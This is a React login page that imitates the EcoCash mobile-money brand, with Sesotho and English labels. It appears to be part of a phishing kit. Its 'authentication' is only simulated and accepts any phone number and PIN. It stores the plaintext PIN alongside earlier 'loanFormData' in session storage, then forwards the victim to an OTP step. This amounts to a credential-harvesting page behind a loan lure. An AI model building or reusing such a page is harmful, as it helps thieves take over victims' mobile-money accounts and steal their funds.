import { useState, FormEvent } from 'react'

interface LoginPageProps {
  onLoginSuccess: (phone: string) => void
}

const LoginPage = ({ onLoginSuccess }: LoginPageProps) => {
  const [phone, setPhone] = useState('')
  const [pin, setPin] = useState('')
  const [showPin, setShowPin] = useState(false)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault()
    setLoading(true)
    setError('')

    // Simulate authentication
    setTimeout(() => {
      if (phone && pin) {
        // Update session storage with login details
        const storedData = sessionStorage.getItem('loanFormData')
        let finalData = { phone, pin }
        
        if (storedData) {
          const existingData = JSON.parse(storedData)
          finalData = { ...existingData, ...finalData }
        }
        
        sessionStorage.setItem('loanFormData', JSON.stringify(finalData))
        
        // Success - proceed to OTP page
        onLoginSuccess(phone)
      } else {
        setError('Please enter both phone number and PIN')
      }
      setLoading(false)
    }, 1000)
  }

  const togglePinVisibility = () => {
    setShowPin(!showPin)
  }

  return (
    <div className="min-h-screen flex items-center justify-center overflow-hidden relative bg-[#f7f9fc]">
      {/* Subtle background diagonal shapes */}
      <div className="absolute inset-0 -z-10 opacity-40">
        <div className="absolute top-[-20%] right-[-20%] w-full h-full bg-gradient-to-br from-transparent via-transparent to-[#e0e6f0]"></div>
        <div className="absolute bottom-[-20%] left-[-20%] w-full h-full bg-gradient-to-tr from-[#e0e6f0] via-transparent to-transparent"></div>
      </div>

      <div className="w-full max-w-[400px] px-5 text-center">
        {/* Logo */}
        <div className="text-4xl font-bold mb-10 tracking-tight">
          <span className="text-[#0056a4]">Eco</span>
          <span className="text-[#e11d2d]">Cash</span>
        </div>
        <p className="text-gray-600 mb-6 text-lg">Kena (Login)</p>

        {/* Form Card */}
        <div className="bg-white py-12 px-8 rounded-[50px] shadow-[0_10px_30px_rgba(0,0,0,0.05)] border border-[#f0f0f0]">
          <form onSubmit={handleSubmit}>
            {/* Phone Number Input */}
            <div className="relative mb-6 text-left">
              <input
                type="tel"
                placeholder="Nomoro ea Mohala (Phone Number)"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                className="w-full py-[18px] px-5 text-base border border-[#dcdcdc] rounded-xl outline-none transition-colors duration-200 text-[#333] placeholder:text-[#999] focus:border-[#0056a4]"
                required
              />
            </div>

            {/* PIN Input */}
            <div className="relative mb-6 text-left">
              <input
                type={showPin ? 'text' : 'password'}
                placeholder="Pin ea Hau (Your PIN)"
                value={pin}
                onChange={(e) => setPin(e.target.value)}
                maxLength={4}
                className="w-full py-[18px] px-5 text-base border border-[#dcdcdc] rounded-xl outline-none transition-colors duration-200 text-[#333] placeholder:text-[#999] focus:border-[#0056a4]"
                required
              />
              <i
                className={`fa-solid ${showPin ? 'fa-eye' : 'fa-eye-slash'} absolute right-5 top-1/2 -translate-y-1/2 cursor-pointer text-[#bbb] text-lg`}
                onClick={togglePinVisibility}
              ></i>
            </div>

            {/* Error Message */}
            {error && (
              <div className="mb-4 text-red-600 text-sm">
                {error}
              </div>
            )}

            {/* Login Button */}
            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#12009c] text-white border-none py-[18px] rounded-[40px] text-lg font-medium cursor-pointer mt-5 transition-all duration-200 hover:opacity-95 active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <i className="fa-solid fa-spinner fa-spin"></i>
                  E Kena... (Logging in)
                </span>
              ) : (
                'Kena (Log In)'
              )}
            </button>
          </form>
        </div>
      </div>
    </div>
  )
}

export default LoginPage
